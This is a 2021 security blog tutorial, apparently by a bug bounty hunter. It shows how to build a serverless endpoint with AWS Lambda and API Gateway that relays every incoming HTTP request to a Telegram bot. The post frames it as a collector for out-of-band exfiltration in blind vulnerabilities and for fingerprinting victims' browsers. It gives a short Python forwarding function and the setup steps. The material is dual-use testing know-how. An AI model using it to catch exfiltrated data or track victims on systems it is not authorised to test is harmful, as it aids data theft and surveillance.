<!DOCTYPE html> <html lang="en-US"> <head prefix="og: http://ogp.me/ns#"> <meta charset="UTF-8" /> <meta http-equiv="X-UA-Compatible" content="ie=edge" /> <meta name="viewport" content="width=device-width, initial-scale=1.0" /> <meta name="mobile-web-app-capable" content="yes" /> <meta name="apple-mobile-web-app-capable" content="yes" /> <meta name="application-name" content="xpl0ited1" /> <meta name="apple-mobile-web-app-status-bar-style" content="#fff" /> <meta name="apple-mobile-web-app-title" content="xpl0ited1" /> <title> Creating a Serverless Exfiltrating Bot with AWS Lambda and Telegram - xpl0ited1 </title> <link rel="alternate" href="https://xpl0ited1.io/awslambda-telegrambot/" hreflang="en-US" /> <link rel="canonical" href="https://xpl0ited1.io/awslambda-telegrambot/" /> <meta name="description" content="Bug Bounty Hunter, CyberSecurity Researcher @cntr0llz." /> <meta name="referrer" content="no-referrer-when-downgrade" /> <meta property="fb:app_id" content="" /> <meta property="og:site_name" content="Creating a Serverless Exfiltrating Bot with AWS Lambda and Telegram | xpl0ited1" /> <meta property="og:title" content="Creating a Serverless Exfiltrating Bot with AWS Lambda and Telegram | xpl0ited1" /> <meta property="og:type" content="website" /> <meta property="og:url" content="https://xpl0ited1.io/awslambda-telegrambot/" /> <meta property="og:description" content="Bug Bounty Hunter, CyberSecurity Researcher @cntr0llz." /> <meta property="og:image" content="https://xpl0ited1.io/assets/img/ogp.png" /> <meta property="og:image:width" content="640" /> <meta property="og:image:height" content="640" /> <meta name="twitter:card" content="summary" /> <meta name="twitter:title" content="Creating a Serverless Exfiltrating Bot with AWS Lambda and Telegram | xpl0ited11" /> <meta name="twitter:url" content="https://xpl0ited1.io/awslambda-telegrambot/" /> <meta name="twitter:site" content="@xpl0ited11" /> <meta name="twitter:creator" content="@xpl0ited11" /> <meta name="twitter:description" content="Bug Bounty Hunter, CyberSecurity Researcher @cntr0llz." /> <meta name="twitter:image" content="https://xpl0ited1.io/assets/img/ogp.png" /> <link type="application/atom+xml" rel="alternate" href="https://xpl0ited1.io/feed.xml" title="xpl0ited1" /> <link rel="apple-touch-icon" sizes="180x180" href="/assets/favicons/apple-touch-icon.png" /> <link rel="icon" type="image/png" sizes="32x32" href="/assets/favicons/favicon-32x32.png" /> <link rel="icon" type="image/png" sizes="16x16" href="/assets/favicons/favicon-16x16.png" /> <link rel="manifest" href="/assets/favicons/site.webmanifest" /> <link rel="mask-icon" href="/assets/favicons/safari-pinned-tab.svg" color="#5bbad5" /> <meta name="apple-mobile-web-app-title" content="xpl0ited1" /> <meta name="application-name" content="xpl0ited1" /> <meta name="msapplication-TileColor" content="#da532c" /> <meta name="theme-color" content="#2c2c2c" /> <link rel="stylesheet" href="/assets/css/style.css" /> </head> <body data-theme="dark" class="notransition"> <script> const body = document.body; const data = body.getAttribute("data-theme"); const initTheme = (state) => { if (state === "dark") { body.setAttribute("data-theme", "dark"); } else if (state === "light") { body.removeAttribute("data-theme"); } else { localStorage.setItem("theme", data); } }; initTheme(localStorage.getItem("theme")); setTimeout(() => body.classList.remove("notransition"), 75); </script> <div class="navbar" role="navigation"> <nav class="menu"> <input type="checkbox" id="menu-trigger" class="menu-trigger" /> <label for="menu-trigger"> <span class="menu-icon"> <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 512 512" > <path d="M64,384H448V341.33H64Zm0-106.67H448V234.67H64ZM64,128v42.67H448V128Z" /> </svg> </span> </label> <a id="mode"> <svg class="mode-sunny" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 512 512" > <title>LIGHT</title> <line x1="256" y1="48" x2="256" y2="96" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="256" y1="416" x2="256" y2="464" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="403.08" y1="108.92" x2="369.14" y2="142.86" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="142.86" y1="369.14" x2="108.92" y2="403.08" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="464" y1="256" x2="416" y2="256" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="96" y1="256" x2="48" y2="256" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="403.08" y1="403.08" x2="369.14" y2="369.14" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="142.86" y1="142.86" x2="108.92" y2="108.92" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <circle cx="256" cy="256" r="80" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> </svg> <svg class="mode-moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 512 512" > <title>DARK</title> <line x1="256" y1="48" x2="256" y2="96" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="256" y1="416" x2="256" y2="464" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="403.08" y1="108.92" x2="369.14" y2="142.86" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="142.86" y1="369.14" x2="108.92" y2="403.08" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="464" y1="256" x2="416" y2="256" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="96" y1="256" x2="48" y2="256" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="403.08" y1="403.08" x2="369.14" y2="369.14" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="142.86" y1="142.86" x2="108.92" y2="108.92" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <circle cx="256" cy="256" r="80" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> </svg> </a> <div class="trigger"> <div class="trigger-container"><a class="menu-link" href="/">home</a><a class="menu-link" href="/archive/">archive</a><a class="menu-link" href="/about/">about</a><a class="menu-link rss" href="/feed.xml"> <svg xmlns="http://www.w3.org/2000/svg" width="17" height="17" viewBox="0 0 512 512" fill="#ED812E" > <title>RSS</title> <path d="M108.56,342.78a60.34,60.34,0,1,0,60.56,60.44A60.63,60.63,0,0,0,108.56,342.78Z" /> <path d="M48,186.67v86.55c52,0,101.94,15.39,138.67,52.11s52,86.56,52,138.67h86.66C325.33,312.44,199.67,186.67,48,186.67Z" /> <path d="M48,48v86.56c185.25,0,329.22,144.08,329.22,329.44H464C464,234.66,277.67,48,48,48Z" /> </svg> </a> </div> </div> </nav> </div> <div class="wrapper post"> <main class="page-content" aria-label="Content"> <article itemscope itemtype="https://schema.org/BlogPosting"> <header class="header"> <h1 class="header-title" itemprop="headline">Creating a Serverless Exfiltrating Bot with AWS Lambda and Telegram</h1> <div class="post-meta"> <time datetime="2021-07-15T00:04:20-04:00" itemprop="datePublished"> Jul 15, 2021 </time> <span itemprop="author" itemscope itemtype="https://schema.org/Person"> <span itemprop="name">xpl0ited1</span> </span> <time hidden datetime="" itemprop="dateModified"> Jul 15, 2021 </time> <span hidden itemprop="publisher" itemtype="Person">xpl0ited1</span> <span hidden itemprop="image"></span> <span hidden itemprop="mainEntityOfPage"><p>Helloooooooooo ü§óü§óü§ó, in this post I will show you how to create a serverless exfil bot with Telegram and AWS Lambda + API Gateway.</p> </span> </div> </header> <div class="page-content" itemprop="articleBody"> <p>Helloooooooooo ü§óü§óü§ó, in this post I will show you how to create a serverless exfil bot with Telegram and AWS Lambda + API Gateway.</p> <p>This can help you with the exfiltration of data in OOB and Blind vulnerabilities, also for fingerprinting the victims browser, etc.</p><hr /> <h1 id="creating-the-serverless-function"> <a href="#creating-the-serverless-function" class="anchor-head"></a> Creating the serverless function </h1> <p>First we have to get an AWS account obviously, then we select <code class="language-plaintext highlighter-rouge">Lambda</code> in the services tab, after that we will get to a panel with a list of previously created lambda functions, we just create a new function by clicking at the orange <code class="language-plaintext highlighter-rouge">Create a function</code> button:</p> <p><img src="2021-07-15_22-06.png" alt="alt" /></p> <p>We select <code class="language-plaintext highlighter-rouge">Create from zero</code>, specify the name of the function and select the programming language we are going to use, in this case we select <code class="language-plaintext highlighter-rouge">Python 3.8</code>. Then we just click on the orange <code class="language-plaintext highlighter-rouge">Create a function</code> button:</p> <p><img src="2021-07-15_22-08.png" alt="alt" /></p> <p>After creating the function we get a panel as shown in the image with a template function that returns <code class="language-plaintext highlighter-rouge">Hello from Lambda!</code></p> <p><img src="2021-07-15_22-09.png" alt="alt" /></p> <p>For this use case we must load some external libraries on to the serverless function, this because AWS Lambda env by default doesn‚Äôt loads the generic Python SDK, in other words, in this case we need to use the <code class="language-plaintext highlighter-rouge">requests</code> Python library and the base env for a lambda function doesn‚Äôt have it. For importing these ‚Äúgeneric‚Äù Python libraries we must click were it puts <code class="language-plaintext highlighter-rouge">Layers</code>, under the name of the function.</p> <p><img src="2021-07-15_22-09_1.png" alt="alt" /></p> <p>Then we click at <code class="language-plaintext highlighter-rouge">Add layer</code></p> <p><img src="2021-07-15_22-09_2.png" alt="alt" /></p> <p>Here we are presented to a panel to select with layer we are going to import or add. We select the <code class="language-plaintext highlighter-rouge">Specify ARN</code>, and add the following <code class="language-plaintext highlighter-rouge">ARN</code>:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>arn:aws:lambda:us-east-1:668099181075:layer:AWSLambda-Python-AWS-SDK:4
</code></pre></div></div> <p>Then we click <code class="language-plaintext highlighter-rouge">Add</code>:</p> <p><img src="2021-07-15_22-10.png" alt="alt" /></p> <p>With all that we are just created the base for our <code class="language-plaintext highlighter-rouge">Lambda</code> function.</p> <hr /> <h1 id="creating-the-api"> <a href="#creating-the-api" class="anchor-head"></a> Creating the API </h1> <p>Now in the services tab we select <code class="language-plaintext highlighter-rouge">API Gateway</code>, were the following panel will load. Here we must click at <code class="language-plaintext highlighter-rouge">Add API</code>:</p> <p><img src="2021-07-15_22-14.png" alt="alt" /></p> <p>We select the type of API we are going to use, in this case an <code class="language-plaintext highlighter-rouge">API HTTP</code></p> <p><img src="2021-07-15_22-15.png" alt="alt" /></p> <p>Now we must select the serverless function we are going to integrate with the API, and specify the name of the API.</p> <p><img src="2021-07-15_22-16.png" alt="alt" /></p> <p>In the <code class="language-plaintext highlighter-rouge">Config routes</code> panel we should specify the <code class="language-plaintext highlighter-rouge">ANY</code> method, so we can trigger the serverless function with any HTTP method. Also we must specify a base path:</p> <p><img src="2021-07-15_22-17.png" alt="alt" /></p> <p>In this step we let it as default:</p> <p><img src="2021-07-15_22-17_1.png" alt="alt" /></p> <p>Here we just click at <code class="language-plaintext highlighter-rouge">Create</code></p> <p><img src="2021-07-15_22-17_2.png" alt="alt" /></p> <p>After the creation of the API we will get a URL of the API that will trigger our serverless function:</p> <p><img src="2021-07-15_22-19.png" alt="alt" /></p> <p>There is a menu at the left of the screen, there we select the <code class="language-plaintext highlighter-rouge">Routes</code> option:</p> <p><img src="2021-07-15_22-19_1.png" alt="alt" /></p> <p>Here we will place a default route that will trigger our serverless function if any of the other routes doesn‚Äôt match in the HTTP request, we must put the <code class="language-plaintext highlighter-rouge">$default</code> value and the click <code class="language-plaintext highlighter-rouge">Create</code>:</p> <p><img src="2021-07-15_22-20.png" alt="alt" /></p> <p>We must specify an integration for the default route, here we select again our Lambda function:</p> <p><img src="2021-07-15_22-20_1.png" alt="alt" /></p> <p><img src="2021-07-15_22-20_2.png" alt="alt" /></p> <p>After the integration between the route and the serverless function, we must click at <code class="language-plaintext highlighter-rouge">Deploy</code>:</p> <p><img src="2021-07-15_22-20_3.png" alt="alt" /></p> <p>Now for testing purposes we check with the URL provided before in our browser to see if the integration was successful</p> <p><img src="2021-07-15_22-21.png" alt="alt" /></p> <p><img src="2021-07-15_22-21_1.png" alt="alt" /></p> <p><img src="2021-07-15_22-22.png" alt="alt" /></p> <hr /> <h1 id="updating-the-serverless-function-code"> <a href="#updating-the-serverless-function-code" class="anchor-head"></a> Updating the serverless function code </h1> <p>Now we must modify the code of the serverless function, with the following code:</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="kn">import</span> <span class="nn">json</span>
    <span class="kn">from</span> <span class="nn">botocore.vendored</span> <span class="kn">import</span> <span class="n">requests</span>

    <span class="k">def</span> <span class="nf">telegram_bot_sendtext</span><span class="p">(</span><span class="n">bot_message</span><span class="p">):</span>
        
        <span class="n">bot_token</span> <span class="o">=</span> <span class="s">''</span>
        <span class="n">bot_chatID</span> <span class="o">=</span> <span class="s">''</span>
        <span class="n">send_text</span> <span class="o">=</span> <span class="s">'https://api.telegram.org/bot'</span> <span class="o">+</span> <span class="n">bot_token</span> <span class="o">+</span> <span class="s">'/sendMessage?chat_id='</span> <span class="o">+</span> <span class="n">bot_chatID</span> <span class="o">+</span> <span class="s">'&amp;parse_mode=Markdown&amp;text='</span> <span class="o">+</span> <span class="n">bot_message</span>
    
        <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">send_text</span><span class="p">)</span>
    
    
    <span class="k">def</span> <span class="nf">lambda_handler</span><span class="p">(</span><span class="n">event</span><span class="p">,</span> <span class="n">context</span><span class="p">):</span>
        <span class="n">headers</span> <span class="o">=</span> <span class="s">""</span>
        <span class="k">for</span> <span class="n">key</span><span class="p">,</span> <span class="n">value</span> <span class="ow">in</span> <span class="n">event</span><span class="p">[</span><span class="s">"headers"</span><span class="p">].</span><span class="n">items</span><span class="p">():</span>
            <span class="n">headers</span> <span class="o">=</span> <span class="n">headers</span> <span class="o">+</span> <span class="n">key</span> <span class="o">+</span> <span class="s">":"</span> <span class="o">+</span> <span class="n">value</span> <span class="o">+</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span>
        
        <span class="n">telegram_bot_sendtext</span><span class="p">(</span><span class="n">json</span><span class="p">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">event</span><span class="p">))</span>
        <span class="c1"># TODO implement
</span>        <span class="k">return</span> <span class="p">{</span>
            <span class="s">'statusCode'</span><span class="p">:</span> <span class="mi">200</span>
        <span class="p">}</span>

</code></pre></div></div> <p>Dont forget to <code class="language-plaintext highlighter-rouge">Deploy</code>!!! ¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†üëáüëá</p> <p><img src="2021-07-15_22-22_1.png" alt="alt" /></p> <hr /> <h1 id="creating-the-telegram-bot"> <a href="#creating-the-telegram-bot" class="anchor-head"></a> Creating the telegram bot </h1> <p>We have to send a message to <code class="language-plaintext highlighter-rouge">@BotFather</code>, with the <code class="language-plaintext highlighter-rouge">/newbot</code> command, then specify the name of the bot, and we will get a <code class="language-plaintext highlighter-rouge">Bot Token</code>, as shown in the following image:</p> <p><img src="2021-07-15_22-26.png" alt="alt" /></p> <p>We send a message to our new bot, any message, or just <code class="language-plaintext highlighter-rouge">/start</code>:</p> <p><img src="2021-07-15_22-28.png" alt="alt" /></p> <p>Now we need a <code class="language-plaintext highlighter-rouge">Chat ID</code> for our serverless function work. So we must go to the following URL specifying the Bot Token, and taking note of the <code class="language-plaintext highlighter-rouge">id</code> field of the <code class="language-plaintext highlighter-rouge">chat</code> object:</p><pre><code class="language-url">https://api.telegram.org/bot&lt;bot-token&gt;/getUpdates
</code></pre><p><img src="2021-07-15_22-29.png" alt="alt" /></p> <p>After adding the <code class="language-plaintext highlighter-rouge">Bot Token</code> and the <code class="language-plaintext highlighter-rouge">Chat ID</code> in the code of the serverless function, we <code class="language-plaintext highlighter-rouge">Deploy</code>:</p> <p><img src="2021-07-15_22-31.png" alt="alt" /></p> <p>We test the bot going to the URL provided after creating the API:</p> <p><img src="2021-07-15_22-32.png" alt="alt" /></p> <p>If everything is fine, we should get a message at Telegram with the HTTP request details,</p> <p><img src="2021-07-15_22-33.png" alt="alt" /></p> <p>And that‚Äôs it, we just built a nice OOB bot XD ü•≥ü•≥ü•≥ü•≥ü•≥ü•≥ü•≥</p> <hr /> <p>In the next post I will show you how to use your own domain in the URL, to get something like this:</p> <p><img src="2021-07-15_23-57.png" alt="alt" /></p> <p>Cheers!!!! üòâ</p><hr /> <p>If any comment with this or suggestion, please contact me at <code class="language-plaintext highlighter-rouge">xpl0ited1@pm.me</code></p> </div> </article> </main> <nav class="post-nav"> <a class="post-nav-item post-nav-prev" href="/postsmessagefinder/" > <div class="nav-arrow">Previous</div> <span class="post-title">Tools: postMessageFinder</span> </a> <a class="post-nav-item post-nav-next" href="/gitgrep/"> <div class="nav-arrow">Next</div> <span class="post-title">Tools: githubGrep</span> </a> </nav> <footer class="footer"> <a class="footer_item" href="/thanks">ack.</a> <!-- <a class="footer_item" href="javascript::void(0)">resume</a>--> <a class="footer_item" href="/feed.xml">rss</a> <span class="footer_item">&copy; 2022</span> <small class="footer_copyright"> <!-- Klis√© Theme: https://github.com/piharpi/jekyll-klise --> <!-- <a--> <!-- href="https://github.com/piharpi/jekyll-klise"--> <!-- target="_blank"--> <!-- rel="noreferrer noopener"--> <!-- >klis√©</a--> <!-- >--> <!-- theme on--> <!-- <a href="https://jekyllrb.com" target="_blank" rel="noreferrer noopener"--> <!-- >jekyll</a--> <!-- >--> </small> </footer> <script src="/assets/js/main.js" defer="defer"></script> </div> </body> </html>
